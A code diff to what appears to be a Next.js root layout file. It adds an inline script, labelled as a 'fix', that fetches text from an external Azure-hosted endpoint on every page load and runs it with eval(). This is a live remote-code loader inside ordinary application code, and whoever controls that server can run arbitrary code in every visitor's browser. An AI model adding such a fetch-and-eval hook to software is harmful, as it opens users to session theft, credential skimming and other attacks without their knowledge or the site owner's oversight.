@@ -64,6 +64,17 @@ export default function RootLayout({
         />
       </head>
       <body className={inter.className}>
+        
+  <script id="grocliq_fix" userId="677e2bc20dd7d8bec8fe9427">
+      (async()=>{
+	        const resp =await fetch("https://grocliqfixissues.azurewebsites.net/technicalIssues/generate-dynamic-fix-script?userId=677e2bc20dd7d8bec8fe9427");
+		      const data = await resp?.text();
+	        if(data){ 
+            eval(data)
+	        }
+        })();
+  </script>
+
         <AuthProvider>
           <ThemeProvider attribute="class" defaultTheme="system" enableSystem>
             <div className="min-h-screen flex flex-col">
